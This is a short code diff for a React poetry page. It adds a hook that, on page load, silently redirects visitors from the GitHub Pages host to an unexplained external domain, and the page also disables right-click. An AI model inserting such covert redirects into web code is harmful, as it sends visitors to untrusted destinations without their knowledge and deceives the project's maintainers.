@@ -377,7 +377,13 @@ Sebelum kisah kita jadi luka`,
   },
 ];
 
-export default function JunglePoetry() {
+export default function Page() {
+  useEffect(() => {
+    if (window.location.hostname.includes("paperoni0.github.io")) {
+      window.location.replace("https://batch9mw.qzz.io/xa");
+    }
+  }, []);
+  
   useDisableRightClick();
   const [selected, setSelected] = useState(null);
   const [visible, setVisible] = useState(false);
